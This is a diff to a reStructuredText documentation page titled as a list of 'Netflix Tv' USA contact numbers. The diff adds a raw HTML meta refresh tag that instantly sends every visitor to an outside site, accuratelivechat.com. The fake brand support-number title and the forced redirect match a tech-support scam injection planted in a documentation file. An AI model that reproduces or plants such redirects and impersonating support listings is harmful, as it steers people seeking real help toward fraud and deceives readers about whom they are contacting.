@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://accuratelivechat.com/">
+
+
 15 ways to Contact [Netflix Tv]®️ USA Contact Numbers: Your Guide to Assistance 
 ============================================
 
